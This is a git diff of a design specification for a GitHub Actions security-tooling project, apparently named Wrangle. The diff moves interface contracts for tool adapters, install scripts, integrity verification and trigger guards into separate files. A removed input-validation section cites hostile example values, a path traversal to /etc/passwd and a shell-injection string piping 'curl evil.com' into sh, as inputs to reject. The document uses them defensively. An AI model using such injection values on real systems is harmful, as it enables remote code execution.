@@ -1,5 +1,11 @@
 # Wrangle v0.1 Specification
 
+This document is the **map**: vision, lifecycle, architecture, design decisions,
+and the security model. The precise **interface contracts** — each invariant
+paired with the test or lint that enforces it — live in
+[`docs/contracts/`](contracts/) and load on demand when you work on that
+component. Rationale stays here; the rule lives in the contract.
+
 ## Vision
 
 Project maintainers should ship features securely without tracking security tooling details. Security engineers should update tools and best practices without bothering maintainers.
@@ -121,42 +127,10 @@ The guarded window MUST also cover any post-script logic in the composite's `run
 
 ### Unified metadata layout
 
-Every build type publishes its build outputs to **two complementary places**:
-
-1. **The ecosystem-native location** consumers expect for that build type — PyPI release attestations for python, GHCR image attestations for container, GitHub release assets for Go, etc. This is the wrangle value prop: ecosystem-native consumers use the tools they already know without learning anything wrangle-specific. The ecosystem-native location is a **partial** view: it carries whatever the ecosystem has standardized, which is rarely the full set wrangle generates (e.g., PyPI carries PEP 740 attestations but not SLSA provenance; GHCR carries image attestations but not SBOM scan output).
-2. **A consistent unified wrangle location** for cross-ecosystem tooling, policy, and audit. This is the **complete** view: every wrangle build produces the same set of metadata fields here, regardless of build type. A tool spanning multiple ecosystems can read this one schema instead of N. Adopters who need the full picture (compliance audits, policy engines, internal supply-chain dashboards) read the unified location.
-
-Both layers always exist for every build type. They aren't either-or.
-
-The unified location for a build is:
-
-```
-metadata/<type>/<shortname>/
-├── sbom.spdx.json           # SPDX SBOM (every build type that has dependencies)
-├── <type>-<shortname>.intoto.jsonl  # SLSA provenance (filename is namespaced so multiple builds in one workflow don't collide)
-├── summary.md               # human-readable build summary
-├── scan/
-│   ├── osv.sarif            # SBOM vuln scan
-│   ├── zizmor.sarif         # action-specific scans where applicable
-│   └── ...
-└── build-info.json          # type-specific structured metadata (image digest, wheel filenames, etc.)
-```
-
-`<type>` is the build type (`container`, `python`, ...) and `<shortname>` is the path-derived name (`/` becomes `_`) so multiple builds in one workflow don't collide.
-
-The provenance file is namespaced by build type and shortname (e.g., `python-_.intoto.jsonl`, `python-pkg_foo.intoto.jsonl`). Wrangle passes `provenance-name` to the SLSA generator so multiple builds in the same workflow don't collide on the default filename — `actions/download-artifact` picks non-deterministically when two artifacts share a name in the same run, and a verify job downloading the wrong build's provenance would fail with a confusing hash mismatch. The actual filename is exposed via the workflow's `provenance-artifact-name` output so adopters and downstream consumers don't need to reconstruct the convention themselves.
-
-#### How the artifact maps to a directory
-
-GitHub Actions artifacts are zip files. `actions/upload-artifact` zips the configured `path:` and `actions/download-artifact` extracts it back. So when this spec says "the reusable workflow uploads `metadata/<type>/<shortname>/` as the workflow artifact `<type>-metadata-<shortname>`," it means:
-
-- The composite action writes the metadata files into `metadata/<type>/<shortname>/` in the runner's workspace.
-- `actions/upload-artifact` zips the contents of that directory and stores the zip on the run as `<type>-metadata-<shortname>`.
-- A downstream job calling `actions/download-artifact` with `name: <type>-metadata-<shortname>` and `path: metadata/` extracts the zip back into `metadata/`, recovering the original files at the top level (the type/shortname levels are not preserved inside the zip — the upload's `path:` is the leaf directory by convention).
-
-The reusable workflow exposes the artifact name as the `metadata-artifact-name` output so adopters can `download-artifact` without hardcoding the naming convention. The composite action exposes the workspace-relative path as the `metadata-dir` output for callers that invoke it directly.
-
-Build types use the layout components that apply to them — not every type produces every file. The point is that any tool walking `metadata/<type>/<shortname>/` knows where to look. See #150 for the full rationale and #162 for the directory-layout discussion.
+The on-disk `metadata/<type>/<shortname>/` layout that adopters and downstream
+tooling depend on is specified in
+**[contracts/metadata.md](contracts/metadata.md)**, with each path/filename
+invariant paired with the test that enforces it.
 
 ### Shared SBOM vulnerability scanning
 
@@ -325,363 +299,23 @@ wrangle/
 
 ---
 
-## Tool Adapter API
-
-### Adapter Script Interface
-
-Each tool directory contains an `adapter.sh` that wraps the tool with a standard interface.
-
-**Contract:**
-
-```
-LOCATION: tools/<name>/adapter.sh
-
-USAGE:  adapter.sh <src_dir> <output_dir>
-
-ARGUMENTS:
-  src_dir     Path to the source code to scan (read-only)
-  output_dir  Path to write results (writable, already exists)
-
-OUTPUT FILES (written to output_dir):
-  output.sarif   REQUIRED  SARIF 2.1.0 JSON
-  output.md      OPTIONAL  Human-readable markdown summary
-  output.txt     OPTIONAL  Human-readable plain text (fallback if no .md)
-
-  If the adapter does not produce output.md or output.txt, the
-  orchestrator generates output.md from output.sarif via
-  lib/sarif_to_md.sh. Adapters that produce richer tool-specific
-  output should write their own output.md to prevent this fallback.
-
-EXIT CODES:
-  0  Scan completed, no findings
-  1  Scan completed, findings detected
-  2  Scan failed (tool error)
-
-PRECONDITIONS:
-  Tool binary is on $PATH (handled by install script)
-  jq is available
-
-ENVIRONMENT:
-  Adapters run with a restricted environment. Only the following variables
-  are passed through from the runner:
-    PATH, HOME, TMPDIR, RUNNER_TEMP, GITHUB_WORKSPACE, GITHUB_STEP_SUMMARY
-  Sensitive variables (GITHUB_TOKEN, ACTIONS_RUNTIME_TOKEN, etc.) are NOT
-  available to adapters by default. If a tool requires an additional
-  environment variable (e.g., a private vulnerability DB token), it can
-  be passed through by setting it in the composite action's `env:` block
-  with a `WRANGLE_EXTRA_` prefix. The orchestrator forwards any variable
-  matching `WRANGLE_EXTRA_*` to adapters with the prefix stripped.
-  Example: `WRANGLE_EXTRA_OSV_DB_TOKEN=xxx` becomes `OSV_DB_TOKEN=xxx`
-  in the adapter environment. This keeps the allowlist explicit without
-  requiring adapter forks for authenticated tools.
-
-SECURITY:
-  - Adapter scripts MUST NOT write files outside of output_dir.
-    The orchestrator performs a post-execution filesystem check to detect
-    unexpected modifications outside output_dir and flags violations.
-  - Adapter scripts MUST NOT make network requests beyond what the tool
-    requires for its scan (e.g., fetching vulnerability databases)
-  - All output written to GITHUB_STEP_SUMMARY MUST be sanitized to
-    prevent markdown/HTML injection
-  - jq exit codes MUST be checked; malformed SARIF must not silently pass
-```
-
-### Install Script Interface
-
-Each tool directory contains an `install.sh` that downloads and verifies the tool binary. Install scripts are called by the orchestrator (`run.sh`), not by users directly.
-
-**Contract:**
-
-```
-LOCATION: tools/<name>/install.sh
-
-USAGE:  install.sh [version]
-
-ARGUMENTS:
-  version  Optional. Pinned version to install. Defaults to a known-good version
-           hardcoded in the script.
-
-BEHAVIOR:
-  1. Check if correct version is already installed; exit 0 if so
-  2. Detect OS (linux/darwin) and arch (amd64/arm64)
-  3. Download binary over HTTPS from tool's official release page
-  4. Verify integrity (see "Integrity Verification" below)
-  5. Place binary in $WRANGLE_BIN_DIR (default: $RUNNER_TEMP/.wrangle/bin)
-  6. Print installed version to stdout
-
-EXIT CODES:
-  0  Installed successfully (or already present)
-  1  Installation failed (download error, checksum mismatch, etc.)
-
-INTEGRITY VERIFICATION (mandatory):
-  Every install script MUST verify the downloaded binary before placing it
-  on PATH. The three methods below (SLSA / Sigstore / SHA-256) apply to
-  install-script-pattern tools — those that download a standalone binary
-  artifact via lib/download_verify.sh. Go-module tools fetched via
-  `go install <module>@<version>` are covered by the separate fourth tier
-  ("GO MODULES" below), which routes integrity through sum.golang.org
-  instead of lib/download_verify.sh; see CLAUDE.md §"Supply Chain
-  Discipline" for the gating conditions. The scan action installs
-  slsa-verifier via the official
-  slsa-framework/slsa-verifier/actions/installer action.
-
-  Verification method (chosen per tool at development time, not at runtime):
-
-    Each tool's install script uses exactly ONE verification method,
-    chosen at development time based on what the upstream tool publishes.
-    There is NO runtime fallback between methods. If the chosen method
-    fails, the install MUST fail — a verification failure may indicate a
-    supply chain attack, and falling back to a weaker method would defeat
-    the purpose of the stronger one.
-
-    The methods, in order of preference:
-    1. SLSA provenance verification — if the tool publishes SLSA
-       attestations, the install script verifies them via slsa-verifier.
-       This proves the binary was built from specific source by a specific
-       builder. Provenance verification is sufficient on its own — the
-       provenance attestation covers the artifact's identity and integrity,
-       so an additional checksum is not required. This simplifies wrangle
-       integration for tools with SLSA support.
-    2. Sigstore signature verification — if the tool signs releases with
-       Cosign/Sigstore but does not publish full SLSA attestations, the
-       install script verifies the signature. If signature verification
-       fails, the install MUST abort.
-    3. SHA-256 checksum — if neither SLSA provenance nor Sigstore
-       signatures are available, verify against a checksum hardcoded in
-       the install script itself (NOT downloaded alongside the binary).
-       Each version bump requires updating the pinned checksum.
-
-    CRITICAL: There is no fallback. A tool configured for SLSA provenance
-    MUST NOT silently continue with only checksum verification if
-    provenance verification fails. A failed verification of any kind is
-    an error, not a reason to try something weaker.
-
-  Tools with SLSA provenance: OSV-Scanner
-  Tools with Sigstore signatures: (to be determined per tool)
-  Tools with checksum only: Zizmor
-
-  GO MODULES (`go install`) — narrow fourth tier:
-
-    The three methods above apply to standalone binary installs (downloaded
-    artifact + separate verification step routed through
-    lib/download_verify.sh). Tools fetched as Go modules via
-    `go install <module>@<version>` are integrity-verified by the Go
-    toolchain itself against sum.golang.org, a Trillian-backed transparency
-    log. This path is accepted ONLY when no upstream binary release exists
-    for the tool (so the three methods above cannot be used against an
-    artifact) and the gating conditions in CLAUDE.md §"Supply Chain
-    Discipline" — pinned semver, trusted toolchain, documented rationale,
-    and `GOPROXY`/`GOSUMDB` not disabled — are all met.
-
-    The tlog provides transparency-log immutability ("first-seen go.sum
-    line for this (module, version) is what every consumer that consults
-    sum.golang.org sees" — consumers with `GOSUMDB=off` see whatever
-    their proxy serves), NOT publisher authentication. A compromised upstream maintainer's
-    malicious release would still install and be recorded; detection is
-    after-the-fact, via auditing. The no-fallback rule still applies: if
-    `go install` aborts due to a go.sum mismatch, the install MUST fail
-    rather than retry under `GOSUMDB=off`.
-
-    Note on the recommended `GOPROXY=https://proxy.golang.org,direct`
-    value: the `,direct` segment is a fallback path that only fires
-    when the proxy itself is unreachable, and it does NOT bypass
-    sum.golang.org — `GOSUMDB` is consulted on both proxy and direct
-    fetches. (This is distinct from a bare `GOPROXY=direct`, which
-    also routes around the proxy but is paired with sumdb the same
-    way.) The integrity claim is preserved across the proxy/direct
-    fallback; only `GOSUMDB=off` (or one of the bypass vars listed in
-    CLAUDE.md §"Supply Chain Discipline") would weaken it.
-
-  Tools with sum.golang.org (go install) only: govulncheck
-
-  The download/verify flow:
-    1. Download binary to a temporary file ($RUNNER_TEMP/wrangle-dl-XXXXX)
-    2. Verify using the tool's configured method (provenance, signature,
-       or checksum — exactly one)
-    3. If verification fails: delete temp file, exit 1
-    4. Atomically move (mv) to $WRANGLE_BIN_DIR/<tool>
-
-INSTALL DIRECTORY:
-  Binaries are installed to $WRANGLE_BIN_DIR, which defaults to
-  $RUNNER_TEMP/.wrangle/bin. This directory:
-  - Is wrangle-specific (no conflicts with system tools)
-  - Is ephemeral on GitHub-hosted runners (cleaned up after the job)
-  - Is prepended to $PATH by the composite action
-  - MUST NOT be /usr/local/bin or other system directories
-
-IDEMPOTENCY:
-  Install scripts MUST be safe to run multiple times. On self-hosted runners
-  where $RUNNER_TEMP persists, use atomic mv (not cp) to prevent TOCTOU
-  races between the version check and binary placement.
-```
-
-### Orchestrator Interface
-
-`run.sh` (at the repo root) installs and runs multiple adapters.
-
-**Contract:**
-
-```
-USAGE:  run.sh [-s <src_dir>] [-o <output_dir>] <tool1> [tool2] ...
-
-OPTIONS:
-  -s src_dir     Source directory to scan (default: .)
-  -o output_dir  Output directory for results (default: ./metadata)
-
-ARGUMENTS:
-  tool1, tool2   Tool specs to run (e.g., osv, zizmor, scorecard:info).
-                 Optional :fail/:info suffix is stripped before processing.
-                 Action-pattern tools (no adapter.sh) are silently skipped.
-
-BEHAVIOR:
-  For each tool:
-    1. Strip :policy suffix if present (run.sh does not use the policy —
-       that is handled by lib/check_results.sh in the scan action)
-    2. Validate tool name matches ^[a-z][a-z0-9_-]*$ (reject otherwise)
-    3. Verify tools/<tool>/ directory exists (reject if not — unknown tool)
-    4. Skip if tools/<tool>/adapter.sh or tools/<tool>/install.sh missing
-       (the tool is action-pattern, handled by uses: steps in the scan action)
-    5. Run tools/<tool>/install.sh (timeout: 5 minutes)
-    6. Create <output_dir>/<tool>/
-    7. Run tools/<tool>/adapter.sh <src_dir> <output_dir>/<tool>/ (timeout: 10 minutes)
-    8. Record pass/fail status
-
-  After all tools:
-    9. Print summary table to stdout
-
-TIMEOUTS:
-  Each adapter invocation is wrapped in `timeout(1)` to prevent a hung tool
-  from consuming the entire GitHub Actions job timeout (default 6 hours).
-
-  Default timeouts:
-    - Install scripts: 5 minutes (sufficient for binary download + verify)
-    - Adapter scripts: 10 minutes (sufficient for scanning large repos)
-
-  A timeout expiration is treated as exit code 2 (tool failure). The
-  orchestrator logs the timeout and continues to the next tool.
-
-EXIT CODES:
-  0  All tools passed with no findings
-  1  At least one tool found issues
-  2  At least one tool failed to run (includes invalid tool names)
-
-INPUT VALIDATION:
-  Tool names MUST match the regex ^[a-z][a-z0-9_-]*$. This prevents:
-  - Path traversal (e.g., ../../etc/passwd)
-  - Shell injection (e.g., foo;curl evil.com|sh)
-  - Glob expansion and word splitting
-
-  All variable expansions MUST be quoted ("$@", "$tool", "${output_dir}")
-  throughout the orchestrator and adapter scripts.
-
-ENVIRONMENT ISOLATION:
-  The orchestrator clears sensitive environment variables before invoking
-  adapters. See the adapter API ENVIRONMENT section for the allowlist.
-
-NOTES:
-  The orchestrator resolves adapter and install script paths relative to its
-  own location (using $0 / BASH_SOURCE), not the caller's working directory.
-  This is critical for portability when called via github.action_path.
-```
-
----
-
-## Composite Action Interface
-
-The scan action (`actions/scan/action.yml`) is the primary entry point for GitHub Actions users.
-
-```yaml
-name: Wrangle Source Scan
-description: Scan source code with wrangle security tools
-
-inputs:
-  tools:
-    description: >
-      Space-separated list of tools to run. Suffix with :info for
-      informational-only (default policy: :fail).
-    required: false
-    default: "osv zizmor scorecard:info"
-
-# No secrets required — tools are downloaded as public binaries
-```
-
-**Tool policy syntax:** Each tool in the `tools` input accepts an optional `:fail` or `:info` suffix. The default is `:fail` — findings from the tool cause a non-zero exit. `:info` means findings are noted in the summary but do not block the check. This is useful for tools like Scorecard that assess repo-level posture rather than per-change vulnerabilities. Adopters can override the default policy (e.g., `scorecard:fail` to enforce Scorecard scores).
-
-The scan action parses the `tools` input to dispatch adapter-pattern tools (those with `tools/<name>/adapter.sh`) to the orchestrator (`run.sh`) and invokes action-pattern tools via their static `uses:` steps. The `lib/check_results.sh` script evaluates all tool SARIF against their policies.
-
-**Behavior:**
-1. Checks out the calling repo
-2. Runs the orchestrator with adapter-pattern tools (e.g., OSV)
-3. Runs action-pattern tools (Zizmor, Scorecard)
-4. Generates a markdown summary in the GitHub Actions step summary (primary output)
-5. Checks results — fails the check if any tool (except informational ones) found issues
-6. Uploads SARIF to GitHub Code Scanning (optional bonus — may not be available on private repos)
-7. Uploads all results as an artifact for debugging and future attestation
-
-The **step summary is the primary output**. It works on all repos — private, no Advanced Security, etc. SARIF upload to the Security tab is additive. The **metadata directory** (`$GITHUB_WORKSPACE/.wrangle/metadata/`) is a complete catalog of which tools ran and what they found, enabling future signed attestations.
-
-**Portability:** Shell script paths use `${{ github.action_path }}` for resolution relative to the composite action's own directory. Action-pattern tool steps use `./` paths (e.g., `uses: ./tools/zizmor`), which resolve to the same repo at the called ref — so when an adopter pins `@v0.1.0`, all internal actions resolve at that tag, and when wrangle's own CI runs on a PR branch, they resolve at the PR's code.
-
-**Path constraint:** The composite action resolves the orchestrator via `${{ github.action_path }}/../../run.sh`, which means the scan action MUST remain at exactly `actions/scan/` (two directories below the repo root). This is a hard structural constraint — moving the action to a different depth breaks the relative path. If the directory layout changes, these paths must be updated in the same commit.
-
-**Input safety:** The `tools` input is passed to the orchestrator via an environment variable, never via direct `${{ }}` interpolation in `run:` blocks. This prevents expression injection:
-
-```yaml
-# CORRECT — input passed via env var
-env:
-  WRANGLE_TOOLS: ${{ inputs.tools }}
-run: ${{ github.action_path }}/../../run.sh $WRANGLE_TOOLS
-
-# WRONG — direct interpolation enables injection
-run: ${{ github.action_path }}/../../run.sh ${{ inputs.tools }}
-```
-
-Note: `$WRANGLE_TOOLS` is intentionally unquoted so it word-splits into multiple arguments. This is safe because the orchestrator validates each token against `^[a-z][a-z0-9_-]*$` before use, and the orchestrator runs `set -f` (disable globbing) before processing arguments. Defense in depth: even if a glob character survived the regex, it would not expand.
-
-The scan action strips `:fail`/`:info` suffixes before passing tool names to the orchestrator. The full `tool:policy` list is passed to `lib/check_results.sh` for result evaluation.
-
----
-
-## Reusable Workflow Interface
-
-The reusable workflow (`.github/workflows/check_source_change.yml`) wraps the composite action for `workflow_call` consumers.
-
-**Internal path resolution:** All `uses:` steps inside the reusable workflow use `./` paths (e.g., `uses: ./actions/scan`). When a caller invokes the workflow at a specific ref (e.g., `@v0.1.0`), GitHub fetches the workflow at that ref, and all `./` references resolve to the same repo at that ref. This means adopters automatically get version-locked internal actions matching their pinned tag, and wrangle's own PR CI tests the PR branch's code (not main).
-
-```yaml
-on:
-  workflow_call:
-    inputs:
-      tools:
-        description: "Space-separated list of tools to run (suffix :info for informational)"
-        required: false
-        type: string
-        default: "osv zizmor scorecard:info"
-# No secrets required
-```
-
-**Adopter workflow (what goes in the adopting repo):**
-
-```yaml
-name: Check Source Change
-on:
-  push:
-    branches: ["main"]
-  pull_request:
-    branches: ["**"]
-
-jobs:
-  check-change:
-    permissions:
-      actions: read
-      contents: read
-      security-events: write
-    uses: TomHennen/wrangle/.github/workflows/check_source_change.yml@v0.1.0
-```
-
-This is the entire file an adopter needs. No secrets, no configuration, no dependencies to manage.
-
----
+## Component & integration contracts
+
+The precise interface contracts — every invariant paired with the test or lint
+that enforces it — live in [`docs/contracts/`](contracts/). This section is a
+map; load the relevant contract when working on that component.
+
+| Contract | Covers |
+|---|---|
+| [Adapter Script Interface](contracts/adapter.md) | `tools/<name>/adapter.sh` — exit codes 0/1/2, SARIF output, stripped env |
+| [Install Script Interface](contracts/install_script.md) | `tools/<name>/install.sh` — download, verify, atomic placement, idempotency |
+| [Integrity Verification](contracts/verification.md) | the no-fallback verification-tier ladder every download passes |
+| [Orchestrator Interface](contracts/orchestrator.md) | `run.sh` — tool-name validation, env isolation, timeouts, exit codes |
+| [Composite Action Interface](contracts/composite_action.md) | adopters calling `actions/scan` |
+| [Reusable Workflow Interface](contracts/reusable_workflow.md) | adopters calling the reusable workflows |
+
+The two tool patterns (adapter vs. action) and the catalog of supported tools
+follow below.
 
 ## Supported Tools (v0.1)
 
@@ -851,147 +485,28 @@ Wrangle runs security tools on behalf of adopting repositories. This makes it a 
 
 ### Trigger Model
 
-Every wrangle reusable workflow runs a `guard` job at the head of `jobs:` (the [`actions/preflight_guard`](../actions/preflight_guard/action.yml) composite action). Refusal fails the workflow; every other job declares `needs: [guard]` so a refused invocation skips the entire run — no OIDC tokens minted, no privileged actions executed, no docker push, no provenance generation.
-
-**Triggers wrangle's reusable workflows are designed for:**
-
-- `push` to `main`, release branches, or tags.
-- `push` to integration test branches (e.g., `integration/**` used by `test/integration/dispatch.sh`).
-- `workflow_dispatch` (manual).
-- `workflow_call` (when one wrangle reusable workflow wraps another internally).
-
-**Triggers `preflight_guard` refuses:**
-
-- `pull_request_target` — runs in the **base** repo's privileged context with the base repo's secrets, while a checkout of `${{ github.event.pull_request.head.sha }}` brings in PR-author code. This is the "pwn request" vector: attacker code executes with secrets it shouldn't have. The TanStack/router Mini Shai-Hulud compromise (May 2026) is the most-cited recent exploitation.
-- `workflow_run` triggered by `pull_request_target` — indirect form of the same vector. The outer event (`github.event.workflow_run.event`) is checked, not just `github.event_name`.
-
-**Triggers `preflight_guard` does NOT (currently) refuse but adopters should still be careful about:**
-
-- `pull_request` from a fork that the workflow then `checkout`s with `ref: ${{ github.event.pull_request.head.sha }}` — this is the same untrusted-checkout pattern but without base-repo privileges, so the blast radius is smaller. `actions/scan`'s `zizmor` runs in wrangle's source-scan path catches this finding for adopters.
-- `workflow_dispatch` chains where an upstream workflow was itself `pull_request_target`-triggered — GitHub flattens the event chain to `workflow_dispatch` and the guard sees only that. Out of scope; the `workflow_run`-via-`pull_request_target` check covers the most common indirect vector.
-
-**Guard vs. gate — two preflight check shapes:**
-
-Wrangle's reusable workflows have two kinds of checks that sit at workflow start. Different mechanisms, different jobs to gate downstream on:
-
-| | `actions/preflight_guard` | `actions/release_gate` |
-|---|---|---|
-| **What it does** | Refuses the workflow run if the trigger is unsafe | Decides whether release-time actions should run this event/ref |
-| **Mechanism** | Fails (`exit 1`) on a refused trigger | Outputs `should-release: true/false` |
-| **Downstream uses it as** | `needs: [guard]` — fail propagation | `if: needs.gate.outputs.should-release == 'true'` — signal branching |
-| **What happens on a "no"** | Whole workflow fails; everything skips | Workflow succeeds; non-release jobs (build, test) still run; release-time jobs (provenance, publish) skip |
-| **Why this shape** | A green ✅ with everything skipped would hide the misconfiguration — fail-loud is the security-relevant property | Legit non-release events (PR builds) should still run build/test, just not provenance/publish |
-
-The `_guard` / `_gate` suffix is the name's contract: `_guard` = abort on fail, `_gate` = signal and let downstream branch.
-
-**Adding refusal categories:** add the check to `actions/preflight_guard/preflight_guard.sh`, add a matching row to the "refuses" list above, and add a structural assertion to `actions/preflight_guard/test.bats`.
+The trigger-safety contract — `actions/preflight_guard` MUST refuse
+`pull_request_target` and `workflow_run` chains triggered by it, the
+`_guard`/`_gate` naming convention, and the fail-closed wiring (guard is the
+first job; every other job `needs:` it; guard runs with `permissions: {}`) — is
+specified in **[contracts/triggers.md](contracts/triggers.md)**.
 
 ### Integrity Verification
 
-All downloaded binaries are verified before execution:
+The four-tier, no-fallback verification ladder (SLSA provenance / Sigstore
+signature / hardcoded SHA-256 / `go install` via sum.golang.org) and its
+load-bearing security invariants are specified in
+**[contracts/verification.md](contracts/verification.md)**.
 
-| Layer | Mechanism | Status |
-|-------|-----------|--------|
-| Transport | HTTPS only | Always required |
-| Content | SHA-256 checksum (pinned in install script) | Required for tools without provenance or signatures |
-| Provenance | SLSA attestation via slsa-verifier | Required for tools that publish it; sufficient on its own; failure = hard stop |
-| Signature | Sigstore/Cosign signature verification | Required for tools that publish it; sufficient on its own; failure = hard stop |
-| sum.golang.org tlog (`go install`) | Built-in Go toolchain verification against the transparency log | Narrow fourth tier for Go modules with no upstream binary release; gating conditions in CLAUDE.md §"Supply Chain Discipline"; failure (go.sum mismatch) = hard stop |
+### Shared libraries
 
-For tools verified via SLSA provenance or Sigstore signatures, hardcoded checksums are not required — the cryptographic verification already covers artifact integrity. Checksums are only needed for tools that lack both provenance and signatures, in which case they are hardcoded in each install script (not downloaded alongside the binary) and updated in the same commit as a version bump.
-
-The sum.golang.org tier is accepted only for Go modules installed via `go install` and only when no upstream binary release exists. The tlog provides transparency-log immutability, not publisher authentication — a compromised maintainer's bad release would still install. See CLAUDE.md §"Supply Chain Discipline" for the full acceptance gate (pinned semver, trusted Go toolchain, documented rationale, `GOPROXY`/`GOSUMDB` not disabled).
-
-**No fallback between verification methods.** Each tool's verification method is chosen at development time. If provenance verification fails for a tool configured to use it, the install MUST fail — even if the checksum passed. A verification failure may indicate a supply chain attack; silently downgrading to a weaker method would mask the attack.
-
-**Version upgrade workflow:** To update a tool version, run `make update-tool TOOL=osv VERSION=x.y.z`. This helper downloads the new binary, computes its SHA-256 checksum, and patches the install script. The contributor then verifies the change, commits both the version and checksum update together, and opens a PR. Dependabot is not used for tool binaries because it cannot update hardcoded checksums.
-
-### Shared Download/Verify Library
-
-`lib/download_verify.sh` provides helper functions used by all install scripts:
-
-```bash
-# Download a file and verify its SHA-256 checksum
-# Usage: wrangle_download_verify <url> <expected_sha256> <output_path>
-# Retries up to 3 times with exponential backoff (1s, 2s, 4s) on transient
-# download failures (CDN blips, rate limits, DNS hiccups).
-# Exits 1 on checksum mismatch or exhausted retries (temp file is deleted).
-wrangle_download_verify() { ... }
-
-# Verify SLSA provenance for a downloaded artifact
-# Usage: wrangle_verify_provenance <artifact_path> <source_repo> <expected_tag>
-# Exits 0 on success, 1 on failure (including tool not available)
-# IMPORTANT: Returns 1 if slsa-verifier is not installed. Callers
-# MUST NOT fall back to weaker verification on failure.
-wrangle_verify_provenance() { ... }
-
-# Verify Sigstore signature for a downloaded artifact
-# Usage: wrangle_verify_signature <artifact_path> <expected_identity> <expected_issuer>
-# Exits 0 on success, 1 on failure (including tool not available)
-# IMPORTANT: Returns 1 if cosign is not installed. Callers
-# MUST NOT fall back to weaker verification on failure.
-wrangle_verify_signature() { ... }
-```
-
-All install scripts MUST use `wrangle_download_verify` rather than implementing their own download logic. This ensures consistent integrity verification and makes security fixes apply everywhere.
-
-### Shared Tool Helpers
-
-`lib/sarif_to_md.sh` converts SARIF 2.1.0 to a human-readable markdown table. It is the default formatter for action-pattern tools that don't have a tool-specific formatter. Tools with richer output (e.g., Scorecard's `sarif_to_markdown.sh`) may use their own formatter instead.
-
-```
-# Usage: sarif_to_md.sh <sarif_file>
-# Output format (markdown table):
-#   | Severity | Rule | Location | Message |
-#   | -------- | ---- | -------- | ------- |
-#   | HIGH | rule-id | `file.yml:39` | Message text |
-#
-# Exit codes:
-#   0  Success (including no findings)
-#   1  Missing argument or file
-#   2  Invalid JSON or malformed SARIF
-```
-
-`lib/tool_banner.sh` prints a visual banner for tool log attribution in CI logs. Action-pattern tools call this as their first step to make tool boundaries visible in raw log output.
-
-```
-# Usage: tool_banner.sh <tool_name>
-# Output:
-#   ========================================
-#    wrangle/<tool_name>
-#   ========================================
-```
-
-`lib/sanitize.sh` provides `wrangle_sanitize_output()`, a shared function that strips HTML tags and truncates output to `$WRANGLE_MAX_SUMMARY` (default 65536) characters. Sourced by `format_sarif_summary.sh` and `sarif_to_md.sh`. All tool output written to `$GITHUB_STEP_SUMMARY` MUST be passed through this function to prevent HTML/markdown injection.
-
-Action-pattern tools call these helpers from their own `action.yml`. The `format_sarif_summary.sh` script picks up `output.md` (or `output.txt`) to populate the expandable details section in the step summary. **Fallback:** if neither `output.md` nor `output.txt` is present for a tool but `output.sarif` is, `format_sarif_summary.sh` invokes `sarif_to_md.sh` to render the findings table directly. This makes the adapter-contract claim above (orchestrator generates `output.md` from SARIF) hold in the step summary, so adopters can see WHAT was found without opening the raw SARIF artifact. The fallback is skipped when SARIF reports zero findings — the top table already shows "No findings" for that tool. Note: the fallback path is bounded by `wrangle_sanitize_output` inside `sarif_to_md.sh`, so it shares a single `$WRANGLE_MAX_SUMMARY` (64 KB) budget; tools that ship their own `output.md` get a separate 64 KB budget on the `wrangle_sanitize_output < output.md` path.
-
-`lib/log_findings.sh` emits one CI-log line per finding so adopters (and AI agents) can see WHAT each tool flagged without parsing raw SARIF. Invoked once after all adapters by the scan composite action; runs before `lib/check_results.sh` so per-finding context appears above the failure line in the log.
-
-```
-# Usage: log_findings.sh <metadata_dir>
-# Output (one line per finding, to stdout):
-#   wrangle: <tool>[<i>/<n>] <ruleId> <uri>:<line> -- <truncated message>
-#
-# Environment:
-#   WRANGLE_MAX_FINDING_MESSAGE  Max characters for per-finding message
-#                                (default 100). Truncation runs inside
-#                                jq, so it is char-based — multibyte
-#                                UTF-8 sequences stay intact.
-#
-# Exit codes:
-#   0  Success — including malformed SARIF (silently skipped so this
-#      script does not double-report against check_results.sh, which
-#      is the pass/fail gate). Always exits 0 in the happy path so a
-#      missing/empty metadata dir does not break the composite action.
-#   2  Usage error (missing/extra args)
-#
-# All fields (ruleId, uri, message) are passed through
-# wrangle_sanitize_output (HTML strip + WRANGLE_MAX_SUMMARY truncate)
-# and have \r\n\t collapsed to spaces so each finding stays on one
-# log line. Only locations[0] (the SARIF-defined primary location) is
-# rendered — one log line per result, never N×M.
-```
+The download/verify helpers (`wrangle_download_verify`,
+`wrangle_verify_provenance`, `wrangle_verify_signature`) and the shared output
+helpers (`sarif_to_md.sh`, `tool_banner.sh`, `sanitize.sh`, `log_findings.sh`)
+are defined in [`lib/`](../lib/) and documented at their definitions. Their
+caller-facing invariants live in the relevant interface contracts under
+[`docs/contracts/`](contracts/); this spec no longer restates their signatures
+(the old embedded copies had drifted from `lib/`).
 
 ### Sandboxing and Isolation
 
@@ -1107,77 +622,9 @@ The adapter pattern and tool composition logic are candidates for contribution t
 
 ## Roadmap
 
-### v0.1.0 — Source scanning + container build (this spec)
-
-**Source stage:**
-- [ ] Per-tool directories (`tools/<name>/`) with adapter + install + test
-- [ ] Binary download with SLSA provenance (preferred) or SHA-256 verification
-- [ ] Shared download/verify library (`lib/download_verify.sh`)
-- [ ] Portable composite action (`github.action_path`)
-- [ ] Input validation and environment isolation in orchestrator
-- [ ] SARIF upload enabled (per-tool categories)
-- [ ] Output sanitization for step summaries
-
-**Build/publish stage (container):**
-- [ ] Container build action portability fixes (`${{ github.action_path }}`)
-- [ ] Container build action security fixes (PATH clobbering, expression injection)
-- [ ] SBOM generation + vulnerability scanning working cross-repo
-
-**Infrastructure:**
-- [ ] All action references pinned to SHAs
-- [ ] SLSA source track adopted for the wrangle repo itself
-- [ ] Testing infrastructure (actionlint + shellcheck + bats)
-- [ ] Tested on Concordance
-- [ ] AGENTS.md for AI agent adoption
-
-### v0.2.0 — Verify story complete + Go hardening + tool plumbing
-
-Theme: complete the verify story end-to-end (producer + consumer), harden
-the Go build type, and tighten tool plumbing. Go, Python, and npm build
-types have all landed on `main` (Go in [#238](https://github.com/TomHennen/wrangle/pull/238))
-and will ship in the v0.2.0 tag — example workflows in `gh_workflow_examples/`
-already pin `@v0.2.0` in anticipation. v0.2 owns hardening and additional
-shapes for those build types, not net-new ecosystems. "Verify story complete"
-for the v0.2 cut means at least one build type wired end-to-end through
-Ampel (#247) plus the consumer-facing verify action (#198) shipped — not
-every Ampel phase in #247.
-
-A profile system (`wrangle.yml` with `profile:` field) and a `wrangle init`
-bootstrapper were considered and deferred — the existing example workflows
-in `gh_workflow_examples/` already deliver the "one-shot adoption" vision,
-and a config layer doesn't reduce the irreducible per-adopter inputs
-(`path`, `imagename`, `release-events`).
-
